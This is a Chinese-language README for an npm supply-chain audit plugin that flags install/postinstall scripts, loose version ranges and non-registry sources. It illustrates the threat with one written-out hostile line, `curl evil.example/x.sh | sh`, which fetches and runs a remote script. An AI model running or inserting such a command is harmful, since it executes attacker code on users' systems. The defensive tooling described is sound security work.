# @deepwhale-cn/dsh-dep-audit

[![dshfind 收录](https://dshfind.com/api/badge/feely0208/dsh-dep-audit?lang=zh)](https://dshfind.com/zh/plugins/feely0208/dsh-dep-audit)

[![Listed on dsh-plugin.org](https://dsh-plugin.org/badges/listed.svg)](https://dsh-plugin.org/plugins/feely0208/dsh-dep-audit)


**防供应链攻击与恶意依赖**：装包即执行的脚本、过宽版本、非 registry 来源，都在这一条命令里查完。

**关键词**：依赖投毒 · 供应链攻击 · 恶意依赖 · npm 投毒 · postinstall 脚本 · 供应链安全 · 依赖审计
**Keywords**: dependency poisoning · supply chain attack · malicious package · npm supply chain · postinstall script
**依赖投毒与风险** —— 装包即执行的脚本、过宽版本、非 registry 来源。

## 不装它会怎样

你 `npm install` 了一个看起来正常的包。

它的 `postinstall` 脚本里有一行 `curl evil.example/x.sh | sh` ——
**在你装它的那一刻就执行了**，你甚至没在代码里 import 过它。

近年的大规模 npm 投毒事件（event-stream、ua-parser-js、node-ipc、colors/faker）**全是这条路**。

## 它查什么

| 级别 | 内容 |
|---|---|
| 🔴 高 | 依赖带 install/postinstall 脚本 |
| 🟡 中 | 没有 lockfile · 版本用 `*`/`latest` · git/http 来源 |
| 🟢 低 | `>=x.y.z` 无上界 |

## 安装

```bash
dsh plugin --profile web add @deepwhale-cn/dsh-dep-audit
# 或纯 CLI
npx @deepwhale-cn/dsh-dep-audit
```

## 用法

```bash
dsh-dep-audit                 # 扫当前目录
dsh-dep-audit --demo          # 看检出效果
dsh-dep-audit --html r.html   # HTML 报告
```

![dsh-dep-audit 检查报告示例](https://www.deepwhale.org.cn/plugin-assets/dsh-dep-audit/report.png)

![dsh-dep-audit 演示模式输出](https://www.deepwhale.org.cn/plugin-assets/dsh-dep-audit/demo.png)

![dsh-dep-audit 规则与依据](https://www.deepwhale.org.cn/plugin-assets/dsh-dep-audit/rules.png)

## 边界

- **带 install 脚本 ≠ 恶意** —— `esbuild`/`sharp`/`puppeteer` 这类必须有，已在白名单里。
  报出来的需要你人工确认。
- **不查 CVE 漏洞库**、**不做包名相似度检测**（typosquat 误报率高）。

本插件是一个工具。使用者必须遵守所在地区法律法规，**对使用本项目造成的任何后果自行承担责任。**

---

## 深鲸网安守护系列（共 38 个）

> 一个插件做一件事。**安全问题是链式的** —— 配套用才完整。

**国内合规**（12）｜ [等保对照](https://github.com/feely0208/dsh-cn-mlps) · [日志留存](https://github.com/feely0208/dsh-cn-log-retention) · [备案公示](https://github.com/feely0208/dsh-cn-filing) · [用户同意](https://github.com/feely0208/dsh-consent-guard) · [个人信息权利](https://github.com/feely0208/dsh-data-rights) · [未成年人保护](https://github.com/feely0208/dsh-minor-guard) · [影响评估](https://github.com/feely0208/dsh-pipia) · [数据分类分级](https://github.com/feely0208/dsh-data-classify) · [算法备案](https://github.com/feely0208/dsh-algorithm-filing) · [数据出境](https://github.com/feely0208/dsh-cn-data-export) · [国密合规](https://github.com/feely0208/dsh-cn-crypto) · [AI 内容标识](https://github.com/feely0208/dsh-cn-ai-labeling)

**AI 与 Agent 治理**（6）｜ [AI 输出信任](https://github.com/feely0208/dsh-ai-output-trust) · [外部内容信任](https://github.com/feely0208/dsh-content-trust) · [MCP 安全](https://github.com/feely0208/dsh-mcp-audit) · [Agent 权限](https://github.com/feely0208/dsh-agent-scope) · [策略核对](https://github.com/feely0208/dsh-agent-policy) · [可疑指令](https://github.com/feely0208/dsh-phishing-guard)

**数据与凭据**（5）｜ [敏感数据](https://github.com/feely0208/dsh-data-scan) · [密钥轮换](https://github.com/feely0208/dsh-key-rotate) · [数据留存](https://github.com/feely0208/dsh-data-lifecycle) · [配置审计](https://github.com/feely0208/dsh-env-audit) · [密钥扫描](https://github.com/feely0208/dsh-secret-scan)

**供应链与构建**（5）｜ [开源许可](https://github.com/feely0208/dsh-license-guard) · [依赖投毒](https://github.com/feely0208/dsh-dep-audit) · [CI 安全](https://github.com/feely0208/dsh-ci-guard) · [工具审查](https://github.com/feely0208/dsh-tool-vet) · [物料清单](https://github.com/feely0208/dsh-sbom)

**权限与应急**（3）｜ [最小权限](https://github.com/feely0208/dsh-least-privilege) · [告警外发](https://github.com/feely0208/dsh-alert-relay) · [应急证据包](https://github.com/feely0208/dsh-incident-package)

**行业专项**（4）｜ [医疗行业专项](https://github.com/feely0208/dsh-industry-medical) · [教育行业专项](https://github.com/feely0208/dsh-industry-education) · [金融行业专项](https://github.com/feely0208/dsh-industry-finance) · [地方数据条例](https://github.com/feely0208/dsh-local-regulation)

**编排与交付**（3）｜ [一键体检](https://github.com/feely0208/dsh-guard-suite) · [改前改后复核](https://github.com/feely0208/dsh-fix-verify) · [合规可交付文档](https://github.com/feely0208/dsh-compliance-doc)

都在 DSH 插件市场（dsh-plugin.org）、npm 和 deepwhale.org.cn/guard.html 上。
